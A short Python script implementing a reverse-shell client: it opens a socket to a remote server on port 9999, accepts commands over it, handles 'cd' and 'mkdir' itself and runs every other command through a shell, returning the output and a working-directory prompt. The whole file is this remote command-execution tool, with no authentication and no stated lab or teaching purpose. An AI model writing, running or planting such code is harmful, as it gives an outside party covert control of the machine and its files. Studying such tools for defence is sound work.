import os
import socket
import subprocess
import sys

class Client:
    def __init__(self, host='', port=9999):
        self.host = host
        self.port = port
        self.socket = None
        self.root_dir = os.getcwd()  # root working directory

    def create_socket(self):
        """ create a socket and connect to the server """
        try:
            self.socket = socket.socket()
            self.socket.connect((self.host, self.port))
        except socket.error as msg:
            print(f"Socket creation or connection error: {msg}")
            sys.exit()

    def receive_commands(self):
        """ receive commands from the server and execute them """
        while True:
            data = self.socket.recv(1024).decode("utf-8").strip()
            if data.startswith('cd '):
                new_dir = data[3:].strip()
                # return to root directory
                if new_dir == '~':
                    os.chdir(self.root_dir)
                    self.socket.send(str.encode(f"Changed directory to root: {self.root_dir}\n"))
                # move up one directory (parent)
                elif new_dir == '..':
                    os.chdir('..')
                    self.socket.send(str.encode(f"Changed directory to parent directory: {os.getcwd()}\n"))
                elif os.path.isdir(new_dir):
                    os.chdir(new_dir)
                    self.socket.send(str.encode(f"Changed directory to {new_dir}\n"))
                else:
                    self.socket.send(str.encode(f"Directory not found: {new_dir}\n"))
            elif data.startswith('mkdir '):
                dir_name = data[6:].strip()
                try:
                    os.mkdir(dir_name)
                    self.socket.send(str.encode(f"Directory created: {dir_name}\n"))
                except FileExistsError:
                    self.socket.send(str.encode(f"Directory already exists: {dir_name}\n"))
                except Exception as e:
                    self.socket.send(str.encode(f"Error creating directory: {e}\n"))
            else:
                if len(data) > 0:
                    command = subprocess.Popen(data, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
                    output_bytes = command.stdout.read() + command.stderr.read()
                    output_str = output_bytes.decode("utf-8")
                    self.socket.send(str.encode(output_str + str(os.getcwd()) + '> '))
                    print(output_str)

    def run(self):
        self.create_socket()
        self.receive_commands()
        self.socket.close()

if __name__ == "__main__":
    client = Client()
    client.run()
